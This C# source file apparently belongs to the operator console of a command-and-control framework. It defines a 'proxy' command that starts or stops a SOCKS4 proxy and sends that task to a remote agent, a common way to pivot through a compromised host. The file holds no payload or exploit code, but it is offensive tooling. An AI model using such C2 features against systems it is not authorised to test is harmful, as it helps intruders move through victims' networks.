using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Agent
{
    public class ProxyCommandOptions
    {
        public string verb { get; set; }
        public int port { get; set; }
    }

    public class ProxyCommand : EnhancedCommand<ProxyCommandOptions>
    {
        public override string Category => CommandCategory.Core;
        public override string Description => "Start a Socks4 Proxy on the agent";
        public override string Name => "proxy";

        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("verb", "Start | Stop").FromAmong("start", "stop"),
                new Option<int>(new[] { "--port", "-p" }, () => 1080, "port to use on the server"),
            };

        protected async override Task<bool> HandleCommand(CommandContext<ProxyCommandOptions> context)
        {
            var agent = context.Executor.CurrentAgent;


            if (context.Options.verb == "start")
            {
                var res = await context.CommModule.StartProxy(agent.Metadata.Id, context.Options.port);
                if(!res)
                {
                    context.Terminal.WriteError("Cannot start proxy on the server!");
                    return false;
                }

            }
            
            if(context.Options.verb == "stop")
            {
                var res = await context.CommModule.StopProxy(agent.Metadata.Id);
                if (!res)
                {
                    context.Terminal.WriteError("Cannot stop proxy on the server!");
                }
            }

            context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, context.Options.verb).Wait();
            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");


            return true;
        }
    }

    
}
